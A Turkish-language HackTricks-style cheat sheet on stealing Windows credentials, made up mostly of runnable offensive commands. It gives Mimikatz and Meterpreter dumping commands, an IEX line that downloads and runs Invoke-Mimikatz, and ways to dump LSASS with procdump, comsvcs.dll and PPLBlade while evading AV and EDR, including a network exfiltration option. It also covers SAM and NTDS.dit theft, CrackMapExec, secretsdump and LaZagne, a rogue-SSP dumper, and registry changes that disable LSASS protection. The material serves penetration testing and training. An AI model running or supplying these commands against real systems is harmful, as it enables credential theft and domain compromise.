# Windows Credentials Çalma

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Mimikatz'in yapabileceği diğer şeyleri** [**bu sayfada**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Learn about some possible credentials protections here.**](credentials-protections.md) **Bu korumalar Mimikatz'in bazı credentials'ları çıkarmasını engelleyebilir.**

## Credentials ile Meterpreter

Hedef sistemde passwords ve hashes aramak için oluşturduğum [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials)'i kullanın.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## AV Atlatma

### Procdump + Mimikatz

Çünkü **Procdump'tan** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**meşru bir Microsoft aracı olduğundan**, Defender tarafından tespit edilmez.\
Bu aracı kullanarak şu adımları gerçekleştirebilirsiniz: **dump the lsass process**, **download the dump** ve dump'tan **extract** ederek **the credentials locally** elde etmek.

Ayrıca [SharpDump](https://github.com/GhostPack/SharpDump) kullanabilirsiniz.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Bu işlem [SprayKatz](https://github.com/aas-n/spraykatz) ile otomatik olarak yapılır: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Not**: Bazı **AV**'ler, **procdump.exe** kullanılarak **lsass.exe**'in dump edilmesini **kötü amaçlı** olarak **tespit edebilir**, bunun nedeni **"procdump.exe" and "lsass.exe"** dizelerini **tespit etmeleridir**. Bu yüzden procdump'a argüman olarak lsass.exe adını vermek yerine lsass.exe'nin **PID**'ini geçirmek **daha gizli**dir.

### Dumping lsass with **comsvcs.dll**

Bir DLL olan **comsvcs.dll**, `C:\Windows\System32` içinde bulunur ve bir çökme durumunda **dumping process memory**'den sorumludur. Bu DLL, `MiniDumpW` adlı bir **function** içerir ve `rundll32.exe` kullanılarak çağrılmak üzere tasarlanmıştır.\
İlk iki argümanın kullanımı önemsizdir, ancak üçüncü argüman üç bileşene ayrılır. Dump edilecek process ID'si ilk bileşeni oluşturur, dump dosyasının konumu ikinciyi temsil eder ve üçüncü bileşen kesinlikle **full** kelimesidir. Başka seçenek yoktur.\
Bu üç bileşeni ayrıştırdıktan sonra, DLL dump dosyasını oluşturur ve belirtilen process'in belleğini bu dosyaya aktarır.\
**comsvcs.dll**'in kullanımı ile lsass process'inin dump edilmesi mümkündür; böylece procdump yükleyip çalıştırma ihtiyacı ortadan kalkar. Bu yöntem ayrıntılarıyla şu adreste açıklanmıştır: [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

Çalıştırmak için aşağıdaki komut kullanılır:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Bu işlemi** [**lssasy**](https://github.com/Hackndo/lsassy) **ile otomatikleştirebilirsiniz.**

### **Task Manager ile lsass dökme**

1. Görev Çubuğu'na sağ tıklayın ve Görev Yöneticisi'ni tıklayın
2. Daha fazla ayrıntı'ya tıklayın
3. İşlemler sekmesinde "Local Security Authority Process" işlemini arayın
4. "Local Security Authority Process" işlemine sağ tıklayın ve "Create dump file" seçeneğine tıklayın.

### procdump ile lsass dökme

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) Microsoft tarafından imzalanmış bir binary'dir ve [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) paketinin bir parçasıdır.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## PPLBlade ile lsass'i dumplama

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade), disk üzerine bırakmadan uzak iş istasyonlarına memory dump'ların obfuscate edilerek aktarılmasını destekleyen bir Protected Process Dumper Tool'dur.

**Temel işlevler**:

1. PPL korumasını atlatma
2. Defender'ın imza tabanlı tespit mekanizmalarından kaçınmak için memory dump dosyalarını obfuscate etme
3. RAW ve SMB upload yöntemleriyle memory dump'ı disk üzerine bırakmadan yükleme (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP tabanlı LSASS dump alma (MiniDumpWriteDump kullanmadan)

Ink Dragon, hiç `MiniDumpWriteDump` çağırmayan ve bu sayede API üzerindeki EDR hooks'un hiçbir zaman tetiklenmediği üç aşamalı bir dumper olan **LalsDumper** ile gelir:

1. **Stage 1 loader (`lals.exe`)** – `fdp.dll` içinde 32 adet küçük `d` karakterinden oluşan bir yer tutucu arar, bunu `rtu.txt`'in mutlak yolu ile üzerine yazar, yamanmış DLL'i `nfdp.dll` olarak kaydeder ve `AddSecurityPackageA("nfdp","fdp")` çağrısını yapar. Bu, **LSASS**'ın zararlı DLL'i yeni bir Security Support Provider (SSP) olarak yüklemesini zorlar.
2. **Stage 2 inside LSASS** – LSASS `nfdp.dll`'i yüklediğinde, DLL `rtu.txt`'i okur, her baytı `0x20` ile XOR'lar ve decode edilmiş blob'u belleğe map'ler; ardından yürütmeyi devreder.
3. **Stage 3 dumper** – map'lenmiş payload, MiniDump mantığını hashed API isimlerinden çözülen doğrudan syscalls kullanarak yeniden uygular (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). `Tom` adlı özel bir export `%TEMP%\<pid>.ddt` dosyasını açar, sıkıştırılmış bir LSASS dump'ını dosyaya stream'ler ve handle'ı kapatır; böylece exfiltration daha sonra yapılabilir.

Operatör notları:

* `lals.exe`, `fdp.dll`, `nfdp.dll` ve `rtu.txt` dosyalarını aynı dizinde tutun. Stage 1 sabit kodlu yer tutucuyu `rtu.txt`'in mutlak yolu ile yeniden yazar, bu yüzden bunları ayırmak zinciri kırar.
* Kayıt, `nfdp` değerini `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`'a ekleyerek yapılır. Bu değeri kendiniz seed ederek LSASS'in SSP'yi her boot'ta yeniden yüklemesini sağlayabilirsiniz.
* `%TEMP%\*.ddt` dosyaları sıkıştırılmış dump'lardır. Yerelde açın (decompress), sonra kimlik bilgisi çıkarmak için Mimikatz/Volatility'e verin.
* `lals.exe`'yi çalıştırmak admin/SeTcb hakları gerektirir ki `AddSecurityPackageA` başarılı olsun; çağrı döndükten sonra LSASS rogue SSP'yi şeffaf şekilde yükler ve Stage 2'yi çalıştırır.
* DLL'i diskte silmek onu LSASS'ten çıkartmaz. Ya registry girdisini silip LSASS'i yeniden başlatın (reboot) ya da uzun süreli persistence için bırakın.

## CrackMapExec

### SAM hash'lerini dump'lama
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit'i hedef DC'den
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Hedef DC'den NTDS.dit parola geçmişini dök
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Her NTDS.dit hesabı için pwdLastSet özniteliğini göster
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Bu dosyalar **bulunmalıdır** _C:\windows\system32\config\SAM_ ve _C:\windows\system32\config\SYSTEM._ Ancak **bunları normal bir şekilde kopyalayamazsınız** çünkü korunmaktadırlar.

### Kayıt Defteri'nden

Bu dosyaları çalmanın en kolay yolu, kayıt defterinden bir kopyasını almaktır:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**İndir** bu dosyaları Kali makinenize ve **hashes**'leri şu komutla çıkarın:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Bu servis aracılığıyla korumalı dosyaların kopyasını alabilirsiniz. Administrator olmanız gerekir.

#### Using vssadmin

vssadmin binary yalnızca Windows Server sürümlerinde mevcuttur.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Ama aynı şeyi **Powershell** ile de yapabilirsiniz. Bu, **SAM file'ını nasıl kopyalayacağınızın** bir örneğidir (kullanılan sürücü "C:" ve C:\users\Public'a kaydediliyor) ancak bunu herhangi bir korumalı dosyayı kopyalamak için kullanabilirsiniz:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Kitaptan alınan kod: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Son olarak, SAM, SYSTEM ve ntds.dit dosyalarının bir kopyasını almak için [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) da kullanabilirsiniz.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: This table is tasked with storing details about objects like users and groups.
- **Link Table**: It keeps track of relationships, such as group memberships.
- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### Decrypting the hashes inside NTDS.dit

The hash is cyphered 3 times:

1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
2. Decrypt tha **hash** using **PEK** and **RC4**.
3. Decrypt the **hash** using **DES**.

**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Available since Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).

### **NTDS.dit**'den hashes çıkarma

Dosyalar **NTDS.dit** ve **SYSTEM**'i **elde ettikten** sonra _secretsdump.py_ gibi araçları kullanarak **hashes**'i çıkarabilirsiniz:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ayrıca geçerli bir domain admin kullanıcısıyla onları **otomatik olarak çıkarabilirsiniz**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Büyük **NTDS.dit dosyaları** için, çıkarmak amacıyla [gosecretsdump](https://github.com/c-sto/gosecretsdump) kullanılması önerilir.

Son olarak, ayrıca **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ veya **mimikatz** `lsadump::lsa /inject` kullanılabilir

### **NTDS.dit'ten SQLite veritabanına domain nesnelerinin çıkarılması**

NTDS nesneleri, [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) ile bir SQLite veritabanına çıkarılabilir. Sadece sırlar değil; ham NTDS.dit dosyası elde edildikten sonra daha fazla bilgi çıkarımı için tüm nesneler ve bunların öznitelikleri de çıkarılır.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
The `SYSTEM` hive isteğe bağlıdır ancak sırların şifresini çözmeye izin verir (NT & LM hashes, düz metin parolalar gibi supplemental credentials, kerberos veya trust anahtarları, NT & LM password histories). Diğer bilgilerle birlikte aşağıdaki veriler çıkarılır: kullanıcı ve makine hesapları ve bunların hash'leri, UAC bayrakları, son oturum açma ve parola değişikliği zaman damgası, hesap açıklamaları, isimler, UPN, SPN, gruplar ve recursive üyelikler, organizational units ağacı ve üyelik, trusted domains ile trusts türü, yönü ve öznitelikleri...

## Lazagne

İkili dosyayı [here](https://github.com/AlessandroZ/LaZagne/releases) adresinden indirin. Bu binary'i çeşitli yazılımlardan kimlik bilgilerini çıkarmak için kullanabilirsiniz.
```
lazagne.exe all
```
## SAM ve LSASS'ten kimlik bilgilerini çıkarmak için diğer araçlar

### Windows credentials Editor (WCE)

Bu araç bellekten kimlik bilgilerini çıkarmak için kullanılabilir. İndirmek için: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

SAM dosyasından kimlik bilgilerini çıkarır
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

SAM dosyasından kimlik bilgilerini çıkarın
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

İndirin: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) ve sadece **çalıştırın**, şifreler çıkarılacaktır.

## Boştaki RDP oturumlarını keşfetme ve güvenlik kontrollerini zayıflatma

Ink Dragon’ın FinalDraft RAT'ı `DumpRDPHistory` tasker'ını içerir; teknikleri herhangi bir red-teamer için kullanışlıdır:

### DumpRDPHistory tarzı telemetri toplama

* **Outbound RDP targets** – her kullanıcı hive'ini `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*` altında ayrıştırın. Her alt anahtar sunucu adını, `UsernameHint` değerini ve son yazma zaman damgasını saklar. FinalDraft’in mantığını PowerShell ile şöyle tekrarlayabilirsiniz:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – kimlerin makineyi yönettiğini eşleştirmek için `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` günlükünü Event ID'leri **21** (başarılı oturum açma) ve **25** (bağlantı kesme) için sorgulayın:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Hangi Domain Admin’in düzenli olarak bağlandığını öğrendiğinizde, onların **ayrılmış** oturumu hâlâ varken LSASS'i (LalsDumper/Mimikatz ile) dökün. CredSSP + NTLM fallback, doğrulayıcılarını ve token'larını LSASS içinde bırakır; bunlar daha sonra SMB/WinRM üzerinden tekrar oynatılarak `NTDS.dit` alınabilir veya domain controller'larda persistence hazırlanabilir.

### Registry downgrades targeted by FinalDraft

Aynı implant ayrıca kimlik bilgisi hırsızlığını kolaylaştırmak için birkaç kayıt defteri anahtarıyla oynar:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Ayar `DisableRestrictedAdmin=1` RDP sırasında credential/ticket yeniden kullanımını tam olarak zorlar; pass-the-hash tarzı pivotlara olanak tanır.
* Ayar `LocalAccountTokenFilterPolicy=1` UAC token filtering'i devre dışı bırakarak local admins'e ağ üzerinden kısıtlanmamış token sağlar.
* Ayar `DSRMAdminLogonBehavior=2` DSRM yöneticisinin DC çevrimiçi iken oturum açmasına izin verir; saldırganlara yerleşik başka bir yüksek ayrıcalıklı hesap sağlar.
* Ayar `RunAsPPL=0` LSASS PPL korumalarını kaldırır, LalsDumper gibi dumper'lar için bellek erişimini kolaylaştırır.

## Referanslar

- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
